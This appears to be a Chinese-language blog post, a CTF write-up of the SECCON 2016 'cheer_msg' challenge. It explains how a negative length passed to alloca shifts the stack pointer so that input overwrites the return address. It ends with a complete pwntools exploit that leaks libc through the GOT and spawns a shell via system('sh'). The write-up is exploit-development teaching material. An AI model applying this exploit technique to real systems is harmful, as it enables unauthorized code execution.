@@ -1,0 +1,99 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h3 data-content="1" id="0512c4af63b47ee3681568ce3d4b366b">前言</h3>
+<p>本文目的是以一道比较简单的 <code>ctf</code> 的练手，为后面的分析  <code>RouterOs</code> 的 漏洞和写 <code>exploit</code> 打基础。</p>
+<p><code>Seccon CTF quals 2016</code> 的一道题。</p>
+<p>题目，idb 文件：</p>
+<p><a href="https://gitee.com/hac425/blog_data/tree/master/pwn_with_alloca" target="_blank">https://gitee.com/hac425/blog_data/tree/master/pwn_with_alloca</a></p>
+<h3 data-content="1" id="ddd5a0e99c965655aa76185fb9e08fe5">正文</h3>
+<p>首先看看 <code>main</code> 函数的代码。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104013-ec0a528c-f28a-1.png"/></p>
+<p>逻辑还是比较简单的获取输入后，简单的加了 <code>30</code> 就给 <code>alloca</code> 去分配空间，然后进入 <code>message</code> 函数。</p>
+<p><code>alloca</code> 函数是 从 栈上分配内存， 它分配内存是通过 <code>sub esp , *</code> 来实现的，我们可以转到汇编代码看看。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104024-f2362910-f28a-1.png"/></p>
+<p>可以看到调用 <code>alloca</code> 实际就是通过 <code>sub esp, eax</code> 来分配栈内存。</p>
+<p>我们输入的 <code>num</code> 是 <code>int</code> 类型的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104031-f6693b6c-f28a-1.png"/></p>
+<p>如果我们输入 <code>num</code> 为 负数， <code>sub esp</code> 就相当于 <code>add esp</code> 我们可以把栈指针往栈底移动。</p>
+<p>继续往下看</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104036-f97a6100-f28a-1.png"/></p>
+<p>接下来会调用 <code>message</code> 函数， 可以看到传给他的参数为 <code>esp + 23</code> 和 <code>num</code> ， 进入 <code>message</code> 函数 ，看看他的逻辑。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104043-fdc0939c-f28a-1.png"/></p>
+<p>首先读取 <code>n</code> 个字符 到 <code>buf</code> ， 这两个变量就是我们传入的参数。</p>
+<p>然后读入 <code>0x40</code> 个字符到  <code>message</code> 函数自己定义的局部变量中。</p>
+<p>一切都很正常，没有溢出，没有格式化字符串漏洞。</p>
+<p>程序的漏洞在于传入的 <code>buf</code> 是通过 <code>alloca</code> 分配的内存，我们可以通过输入 负数 使得 <code>alloca</code>的参数为负， 这样我们就可以把 <code>esp</code> 往栈底移动，栈底有<strong>返回地址</strong>, 然后通过 <code>message</code>  中读取数据，覆盖 <code>eip</code> 然后进行 <code>rop</code> 即可。</p>
+<p>要触发漏洞我们需要输入负数，所以在</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104057-061744be-f28b-1.png"/></p>
+<p>会直接返回，不会获取输入，因为它里面调用的是 <code>fgets</code>来获取输入。<code>fgets</code>会有检查。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104105-0aadb788-f28b-1.png"/></p>
+<p>所以我们只能往 <code>message</code> 函数内的缓冲区 <code>t_buf</code>写数据，不过这个缓冲区也是在栈上，同样与 <code>esp</code> 相关，所以我们把<code>esp</code> 往栈底移时，它也是会跟着下移，通过它也可以写 <code>返回地址</code> 的值。</p>
+<p>我们可以输入 <code>-140</code>(这个值可以通过 先输入一个 比较小的比如 <code>-32</code>, 然后计算最后得到的数据的地址距离返回地址位置的距离，来继续调整)</p>
+<p>在 <code>0x0804860E</code> 设个断点</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104111-0e77a3c4-f28b-1.png"/></p>
+<p><code>sub</code> 之后</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104114-10670f94-f28b-1.png"/></p>
+<p>可以看到 <code>esp</code> 已经增大。<br/>
+然后加上一定的 <code>padding</code> (可以使用 <code>pwntools</code> 的 <code>cyclic</code> 计算) ，就能修改 返回地址了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180106104119-1323135e-f28b-1.png"/></p>
+<p>之后就是一般的 <code>rop</code></p>
+<hr/>
+<p>使用 <code>printf</code> 打印 <code>got</code> 表中的 <code>printf</code> 的值，泄露 <code>libc</code> 的地址。然后回到程序的开始，再次触发漏洞， 调用 <code>system("sh")</code></p>
+<hr/>
+<h3 data-content="1" id="0b9a1f204a30ea5a9ac610e4ee6eacd9">总结</h3>
+<p><code>alloca</code> 的细节要注意， 注意输入的数据是有符号的还是无符号的。对于后面计算偏移，可以先动态调试计算一个粗略的值，然后使用 <code>cyclic</code> 确定精确的偏移。</p>
+<p><strong>exp</strong></p>
+<pre><code>from pwn import *
+
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-v']
+r = process("./cheer_msg")
+
+binary = ELF('cheer_msg')
+libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
+
+gdb.attach(r, '''
+bp 0x0804868B
+bp 0x08048610
+    ''')
+
+r.recvuntil("Length &gt;&gt; ")
+r.sendline("-140")
+r.recvuntil("Name &gt;&gt; ")
+
+payload = "a" * 0x10 # padding
+payload += p32(binary.symbols['printf'])
+payload += p32(binary.entry)  # ret to start
+payload += p32(binary.got['printf'])
+
+r.sendline(payload)
+
+r.recvuntil("Message :")
+r.recv(1)
+r.recv(1)
+printf_addr = u32(r.recv(4))
+libc_base = printf_addr - libc.symbols['printf']
+sh = libc_base + libc.search("/bin/sh\x00").next()
+system = libc_base + libc.symbols['system']
+
+log.info("got system: " + hex(system))
+log.info("got base: " + hex(libc_base))
+log.info("get sh " + hex(sh))
+
+
+
+r.recvuntil("Length &gt;&gt; ")
+r.sendline("-140")
+r.recvuntil("Name &gt;&gt; ")
+
+payload = "a" * 0x10 # padding
+payload += p32(system)
+payload += p32(binary.entry)
+payload += p32(sh)
+r.sendline(payload)
+
+r.interactive()</code></pre>
+<p>参考：</p>
+<p><a href="https://github.com/0x90r00t/Write-Ups/tree/master/Seccon/cheer_msg" target="_blank">https://github.com/0x90r00t/Write-Ups/tree/master/Seccon/cheer_msg</a></p>
+</div>
+</div>
